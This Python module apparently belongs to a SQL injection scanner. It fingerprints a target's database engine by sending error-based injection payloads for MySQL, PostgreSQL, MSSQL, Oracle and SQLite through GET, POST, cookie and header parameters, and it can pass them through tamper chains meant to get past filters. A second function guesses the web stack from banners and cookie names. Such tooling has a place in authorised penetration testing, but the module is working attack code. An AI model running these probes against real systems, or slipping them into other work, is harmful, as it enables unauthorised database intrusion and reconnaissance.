"""
DBMS fingerprinting via error signatures and behavioral probes.
Supports GET/POST/COOKIE/HEADER injection points.
"""

from core.http_client import HttpClient, inject_value
from core.payloads import DBMS_ERROR_SIGNATURES
from core.tamper import apply_chain
from core import logger

DBMS_SPECIFIC_PROBES = {
    "MySQL": "' AND @@version_compile_os LIKE '%'--",
    "PostgreSQL": "' AND 1=CAST(version() AS INT)--",
    "MSSQL": "' AND 1=CONVERT(INT,@@version)--",
    "Oracle": "' AND 1=UTL_INADDR.GET_HOST_NAME('a')--",
    "SQLite": "' AND sqlite_version() LIKE '%'--",
}


def _fetch(client: HttpClient, point, payload_value):
    params = point.get("params", {})
    if point["location"] == "GET":
        p = inject_value(params, point["name"], payload_value)
        return client.send("GET", point["base_url"], params=p)
    if point["location"] == "POST":
        p = inject_value(params, point["name"], payload_value)
        return client.send("POST", point["base_url"], data=p)
    if point["location"] == "COOKIE":
        cookies = inject_value(point.get("cookie_base", {}), point["name"], payload_value)
        return client.send("GET", point["base_url"], params=params, cookies=cookies)
    if point["location"] == "HEADER":
        headers = inject_value(point.get("header_base", {}), point["name"], payload_value)
        return client.send("GET", point["base_url"], params=params, headers=headers)
    return None, None


def fingerprint_dbms(client: HttpClient, point, tamper_chain=None) -> dict:
    logger.info(f"[Fingerprint] identifying DBMS via param '{point['name']}' ({point['location']})")
    for dbms, probe_payload in DBMS_SPECIFIC_PROBES.items():
        tampered = apply_chain(probe_payload, tamper_chain) if tamper_chain else probe_payload
        resp, _ = _fetch(client, point, tampered)
        if resp is None:
            continue
        body_lower = resp.text.lower()
        for sig in DBMS_ERROR_SIGNATURES.get(dbms, []):
            if sig in body_lower:
                logger.ok(f"DBMS fingerprinted as {dbms}")
                return {"dbms": dbms, "confidence": "high", "matched_signature": sig}

    return {"dbms": "unknown", "confidence": "low"}


FRAMEWORK_COOKIE_HINTS = {
    "laravel_session": "Laravel (PHP)",
    "phpsessid": "PHP (generic)",
    "asp.net_sessionid": "ASP.NET",
    "csrftoken": "Django (Python)",
    "django_language": "Django (Python)",
    "connect.sid": "Express (Node.js)",
    "jsessionid": "Java (Servlet/Spring)",
    "_rails_session": "Ruby on Rails",
}


def fingerprint_stack(resp) -> dict:
    """
    Best-effort, header/cookie-based fingerprint of the web server,
    backend framework, and OS hinted at by the Server/X-Powered-By
    banners. This is passive (no extra requests) and heuristic --
    banners are often faked or stripped, so treat this as a hint, not
    a guarantee.
    """
    if resp is None:
        return {}
    info = {}
    server = resp.headers.get("Server", "")
    powered_by = resp.headers.get("X-Powered-By", "")
    if server:
        info["web_server"] = server
        low = server.lower()
        for os_hint in ("ubuntu", "debian", "centos", "red hat", "win32", "win64", "windows"):
            if os_hint in low:
                info["os_guess"] = os_hint
                break
    if powered_by:
        info["framework"] = powered_by

    cookie_blob = " ".join(k.lower() for k in resp.cookies.keys())
    for needle, framework in FRAMEWORK_COOKIE_HINTS.items():
        if needle in cookie_blob:
            info.setdefault("framework", framework)
            break

    return info
